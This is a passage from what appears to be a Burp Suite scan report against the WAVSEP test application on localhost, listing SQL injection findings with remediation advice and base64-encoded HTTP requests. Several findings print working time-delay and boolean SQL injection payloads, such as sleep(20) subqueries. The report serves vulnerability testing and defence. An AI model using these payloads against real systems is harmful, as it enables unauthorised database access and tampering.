      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMy1JbmplY3Rpb25JblZpZXctRGF0ZS1CbGluZC0yMDBWYWxpZFJlc3BvbnNlV2l0aERlZmF1bHRPbkV4Y2VwdGlvbi5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTIwYW5kJTIwJzY4NDMnJTNkJzY4NDMgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIGEgZGF0ZSB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpTdW0KPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KODk1CjwvVEQ+CjxURD4KODAwMAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMy1JbmplY3Rpb25JblZpZXctRGF0ZS1CbGluZC0yMDBWYWxpZFJlc3BvbnNlV2l0aERlZmF1bHRPbkV4Y2VwdGlvbi5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTIwYW5kJTIwJzQzOTcnJTNkJzQ0MDAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIGEgZGF0ZSB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpTdW0KPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMy1JbmplY3Rpb25JblZpZXctRGF0ZS1CbGluZC0yMDBWYWxpZFJlc3BvbnNlV2l0aERlZmF1bHRPbkV4Y2VwdGlvbi5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMElkZW50aWNhbC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIGEgZGF0ZSB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpTdW0KPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>663103287878220800</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwNC1JbmplY3Rpb25JblVwZGF0ZS1OdW1lcmljLVRpbWVEZWxheUV4cGxvaXQtMjAwSWRlbnRpY2FsLmpzcD90cmFuc2FjdGlvbklkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMElkZW50aWNhbC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3904362903705129984</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp [description parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>description</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the description parameter. The application took <b>20002</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwNS1JbmplY3Rpb25JblVwZGF0ZS1TdHJpbmctVGltZURlbGF5RXhwbG9pdC0yMDBJZGVudGljYWwuanNwP2Rlc2NyaXB0aW9uPWVtcHR5JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMjQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNSAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggaWRlbnRpY2FsIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgowCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1066537548170643456</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
